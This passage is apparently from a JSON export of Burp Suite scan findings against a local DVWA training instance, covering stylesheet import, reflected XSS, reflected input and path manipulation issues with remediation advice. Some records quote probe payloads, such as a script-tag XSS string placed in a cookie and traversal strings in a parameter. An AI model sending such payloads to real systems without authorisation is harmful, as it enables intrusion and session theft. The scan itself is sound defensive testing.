        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "78": {
        "\ufeffissue__serialNumber": "2.06327E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/login.php",
        "issue__location": "/dvwa/login.php",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "79": {
        "\ufeffissue__serialNumber": "6.99645E+17",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/brute/",
        "issue__location": "/dvwa/vulnerabilities/brute/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>pm04g'&gt;&lt;script&gt;alert(1)&lt;/script&gt;joozj</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "80": {
        "\ufeffissue__serialNumber": "7.09349E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/brute/",
        "issue__location": "/dvwa/vulnerabilities/brute/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "81": {
        "\ufeffissue__serialNumber": "4.23874E+17",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/view_help.php",
        "issue__location": "/dvwa/vulnerabilities/view_help.php [locale parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>locale</b> request parameter is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "82": {
        "\ufeffissue__serialNumber": "9.07708E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/phpinfo.php",
        "issue__location": "/dvwa/phpinfo.php [User-Agent HTTP header]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>User-Agent</b> HTTP header is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "83": {
        "\ufeffissue__serialNumber": "7.54216E+18",
        "issue__type": "1051392",
        "issue__name": "File path manipulation",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/view_help.php",
        "issue__location": "/dvwa/vulnerabilities/view_help.php [id parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>File path manipulation vulnerabilities arise when user-controllable data is placed into a file or URL path that is used on the server to access local resources, which may be within or outside the web root. If vulnerable, an attacker can modify the file path to access different resources, which may contain sensitive information. Even where an attack is constrained within the web root, it is often possible to retrieve items that are normally protected from direct access, such as application configuration files, the source code for server-executable scripts, or files with extensions that the web server is not configured to serve directly.</p>",
        "issue__remediationBackground": "<p>Ideally, application functionality should be designed in such a way that user-controllable data does not need to be placed into file or URL paths in order to access local resources on the server. This can normally be achieved by referencing known files via an index number rather than their name.</p>\\n<p>If it is considered unavoidable to place user data into file or URL paths, the data should be strictly validated against a whitelist of accepted values. Note that when accessing resources within the web root, simply blocking input containing file path traversal sequences (such as dot-dot-slash) is not always sufficient to prevent retrieval of sensitive information, because some protected items may be accessible at the original path without using any traversal sequences. </p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/file-path-traversal\">Web Security Academy: Directory traversal</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/22.html\">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/23.html\">CWE-23: Relative Path Traversal</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/35.html\">CWE-35: Path Traversal: '.../...//'</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/36.html\">CWE-36: Absolute Path Traversal</a></li>\\n\t<li><a href=\"https://capec.mitre.org/data/definitions/126.html\">CAPEC-126: Path Traversal</a></li>\\n</ul>",
        "issue__issueDetail": "The <b>id</b> parameter appears to be vulnerable to file path manipulation attacks. <br><br>The payload <b>./pqh/../brute</b> was submitted in the id parameter. This returned the same content as the base request. The payload <b>.../brute</b> was then submitted, and this returned a different response. This indicates that the application may be vulnerable to file path manipulation.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
